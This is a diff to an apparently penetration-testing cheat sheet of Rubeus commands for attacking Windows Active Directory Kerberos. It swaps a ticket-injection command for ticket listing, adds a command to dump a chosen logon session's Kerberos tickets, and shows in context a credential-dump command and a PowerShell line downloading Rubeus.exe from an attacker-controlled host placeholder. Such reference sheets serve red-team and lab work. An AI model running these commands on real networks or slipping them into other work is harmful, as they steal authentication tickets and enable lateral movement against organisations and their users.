@@ -2,10 +2,10 @@
 
 % ad, windows, rubeus
 
-## inject ticket from file
+## List ticket
 #plateform/windows #target/local #cat/UTILS  
 ```cmd
-.\Rubeus.exe ptt /ticket:<ticket>
+.\Rubeus.exe triage
 ```
 
 ## load rubeus from powershell
@@ -84,6 +84,12 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.ex
 #plateform/windows #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
 .\Rubeus.exe dump
+```
+
+## Dump specific ticket for easy cc
+#plateform/windows #target/local #cat/UTILS  
+```cmd
+.\Rubeus.exe dump /luid:<luid> /service:<service> /nowrap
 ```
 
 ## ask and inject ticket
